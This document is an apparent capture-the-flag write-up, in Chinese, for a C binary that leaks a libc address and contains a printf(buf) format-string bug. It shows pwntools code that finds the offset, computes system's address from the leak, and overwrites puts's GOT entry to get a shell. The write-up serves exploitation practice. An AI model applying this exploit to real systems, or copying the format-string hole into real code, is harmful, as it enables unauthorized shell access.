### source code
```c=
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```

### **normal_string 已經給你 '/bin/sh' 了，只要將 puts 的 got hijack 成 system 的 address 就好**

利用 fmtstr_payload 進行 exploit
```python=
# 用法
payload = fmtstr_payload(offset, {address: value})

'''
offset 為當執行 printf(buf)時, rsp 與 buf 的距離 
address: value 為: 在位置 = address 的地方放入值 value 
'''
```

找 offset
```py=
def exec_fmt(payload):
    p = remote(ip, port)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

'''
猜測: 一直remote並依序放入 AAAA%1$lx, AAAA%2$lx, AAAA%3$lx ...
並對比 printf 出來的輸出來找 offset 的值
'''
```

找 address 以及 value
```py=
# address
puts_got = elf.got['puts']

# value

    #題目有給 setvbuf 的 address, 
    #所以儘管有ASLR, 也可以用加減法找出 system 的 address

r.recvuntil(b'libc: ')
setvbuf_addr = r.recvline().strip().decode('UTF-8')

libc_base = int(setvbuf_addr,16) - libc.sym['setvbuf']
system_addr = libc_base + libc.sym['system']
```

payload
```py=
payload = fmtstr_payload(offset, {puts_got: p64(system_addr)})
```